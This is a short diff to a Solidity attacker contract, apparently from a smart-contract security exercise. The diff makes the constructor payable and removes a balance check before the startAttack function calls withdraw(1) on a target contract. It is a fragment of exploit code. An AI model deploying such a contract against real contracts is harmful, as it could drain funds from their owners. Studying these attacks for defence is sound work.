@@ -8,7 +8,7 @@ contract AttackerContract {
     TargetContractInf targetContract;
     address payable targetContractAddress;
 
-    constructor(address payable _targetContract) {
+    constructor(address payable _targetContract) payable {
         targetContract = TargetContractInf(_targetContract);
         targetContractAddress = _targetContract;
     }
@@ -20,7 +20,6 @@ contract AttackerContract {
     }
 
     function startAttack() public {
-        require(address(targetContract).balance >= 1, "Insufficient balance");
         targetContract.withdraw(1);
     }
 
